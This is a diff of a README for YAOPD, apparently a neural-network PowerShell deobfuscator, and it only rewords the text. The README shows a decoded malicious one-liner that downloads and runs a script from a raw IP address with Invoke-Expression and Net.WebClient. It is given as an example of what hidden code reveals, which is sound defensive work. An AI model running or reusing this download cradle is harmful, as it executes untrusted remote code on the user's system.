@@ -11,14 +11,15 @@ Does the same thing as this:
 
 ```
 
-or this:
+Another example, turns out that this:
 ![alt text](https://github.com/rctcwyvrn/YAOPD/blob/master/obfuscation.png "What the hell is this???")
-actually just does this
+
+Actually just does this:
 ```
 Invoke-Expression (New-Object Net.WebClient).DownloadString("http://177.156.172.5/IssmLlg82") 
 ```
 
-Solution? The solution to the rest of lifes problems, neural networks!
+The solution? The solution to the rest of lifes problems, neural networks!
 
 [Inspiration](https://www.endgame.com/blog/technical-blog/deobfuscating-powershell-putting-toothpaste-back-tube)
 
